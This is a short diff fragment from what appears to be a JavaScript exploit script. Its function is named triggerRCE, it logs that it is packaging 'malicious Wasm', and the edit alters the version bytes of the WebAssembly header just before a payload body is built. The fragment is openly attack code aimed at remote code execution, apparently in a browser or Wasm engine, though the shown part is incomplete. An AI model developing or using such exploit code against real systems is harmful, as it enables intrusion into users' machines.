@@ -15,7 +15,7 @@
         async function triggerRCE() {
             log("[*] Packaging structural-valid malicious Wasm...");
 
-            const magic = [0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00];
+            const magic = [0x00, 0x61, 0x73, 0x6d, 0x01, 0x73, 0x73, 0x73];
             
             // We'll build the payload body first to calculate the exact size
             let payloadBody = [];
